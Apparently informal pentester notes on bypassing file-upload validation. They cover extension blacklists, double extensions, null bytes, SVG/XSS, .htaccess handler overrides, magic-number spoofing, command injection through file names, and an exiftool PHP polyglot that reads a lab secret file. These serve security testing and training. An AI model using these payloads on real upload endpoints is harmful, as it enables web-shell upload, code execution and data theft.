every file upload function has : 
-file name
-file type
-magic number
-file content
-file size


validation : 
-Black list : ^.*\.(php|php1...............)  : try PHP,(pht,PHT : if the server is linux apache
if use iis windows server , try this : .asa .cer

-to make it stored xss ,try use this : .eml (just for enternet explorer)

-White list : you can try write the white word in the name of the file
or like that file.jpg.php

-Null byte injection : 
file.php%001.jpg or file.php\x00.jpg

-svg : you can make it stored xss

-Directory traversel : try do ../../../index.php

-uplaod a image (using imageMagic) try his cve to find ssrf and rce

-validate in magic numbers : try start your file content with GIF89a;(when it is a image)

-zip files : you know that your file name will handle with commande line
             so you can breack the commande like that : filename;cmd;cmd




 -- in the response , header reveal that you are talking to an apache server (the idea is upload 2 files)
    ?filename=.htaccess
    ?content-type=text/plain
    the content of the first file :  AddType application/x-httpd-php .l33t   

    2nd : 
     filename=file.133t

     and see the result

  -- when the validation in the data of the file (so if he need a picture he will validate for those stringer things)
     so you can inject a php file in a image and why not the output in php file (because the validation not in the file name)
     using this cmd : exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

change the content type to image/jpeg
